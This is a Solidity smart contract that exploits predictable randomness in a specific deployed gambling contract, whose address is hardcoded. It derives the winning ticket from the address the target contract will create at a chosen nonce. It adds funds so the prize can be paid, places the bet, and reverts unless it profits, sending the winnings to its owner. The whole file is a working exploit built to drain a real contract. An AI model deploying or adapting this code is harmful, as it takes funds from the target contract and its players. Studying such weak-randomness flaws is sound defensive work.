1 pragma solidity ^0.5.0;
2 
3 interface TargetInterface {
4     function sendTXTpsTX(string calldata UserTicketKey, string calldata setRef) external payable;
5 }
6 
7 contract NonRandomFiveDemo {
8     
9     address payable private targetAddress = 0xC19abA5148A8E8E2b813D40bE1276312FeDdB813;
10     address payable private owner;
11     
12 	modifier onlyOwner() {
13 		require(msg.sender == owner);
14 		_;
15 	}
16 
17     constructor() public payable {
18         owner = msg.sender;
19     }
20 
21     function ping(uint256 _nonce, bool _keepBalance) public payable onlyOwner {
22         uint256 ourBalanceInitial = address(this).balance;
23 
24         uint256 targetBalanceInitial = targetAddress.balance;
25         uint256 betValue = targetBalanceInitial / 28;
26         uint256 betValueReduced = betValue - ((betValue / 1000) * 133);
27         uint256 targetBalanceAfterBet = targetBalanceInitial + betValueReduced;
28         uint256 expectedPrize = (betValueReduced / 100) * 3333;
29         
30         if (expectedPrize > targetBalanceAfterBet) {
31             uint256 throwIn = expectedPrize - targetBalanceAfterBet;
32             targetAddress.transfer(throwIn);
33         }
34 
35         string memory betString = ticketString(_nonce);
36         TargetInterface target = TargetInterface(targetAddress);
37         target.sendTXTpsTX.value(betValue)(betString, "");
38         
39         require(address(this).balance > ourBalanceInitial);
40         
41         if (!_keepBalance) {
42             owner.transfer(address(this).balance);
43         }
44     }
45 
46     function withdraw() public onlyOwner {
47         owner.transfer(address(this).balance);
48     }    
49     
50     function kill() public onlyOwner {
51         selfdestruct(owner);
52     }    
53     
54     function () external payable {
55     }
56 
57     function ticketString(uint256 _nonce) public view returns (string memory) {
58         bytes32 ticketAddressBytes = addressBytesFrom(targetAddress, _nonce);
59         return ticketStringFromAddressBytes(ticketAddressBytes);
60     }
61     
62     function addressBytesFrom(address _origin, uint256 _nonce) private pure returns (bytes32) {
63         if (_nonce == 0x00)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, byte(0x80)));
64         if (_nonce <= 0x7f)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce)));
65         if (_nonce <= 0xff)     return keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce)));
66         if (_nonce <= 0xffff)   return keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce)));
67         if (_nonce <= 0xffffff) return keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce)));
68         return keccak256(abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce)));
69     }
70 
71     function ticketStringFromAddressBytes(bytes32 _addressBytes) private pure returns(string memory) {
72         bytes memory alphabet = "0123456789abcdef";
73         
74         bytes memory ticketBytes = new bytes(5);
75         ticketBytes[0] = alphabet[uint8(_addressBytes[29] & 0x0f)];
76         ticketBytes[1] = alphabet[uint8(_addressBytes[30] >> 4)];
77         ticketBytes[2] = alphabet[uint8(_addressBytes[30] & 0x0f)];
78         ticketBytes[3] = alphabet[uint8(_addressBytes[31] >> 4)];
79         ticketBytes[4] = alphabet[uint8(_addressBytes[31] & 0x0f)];
80         
81         return string(ticketBytes);
82     }
83 
84 }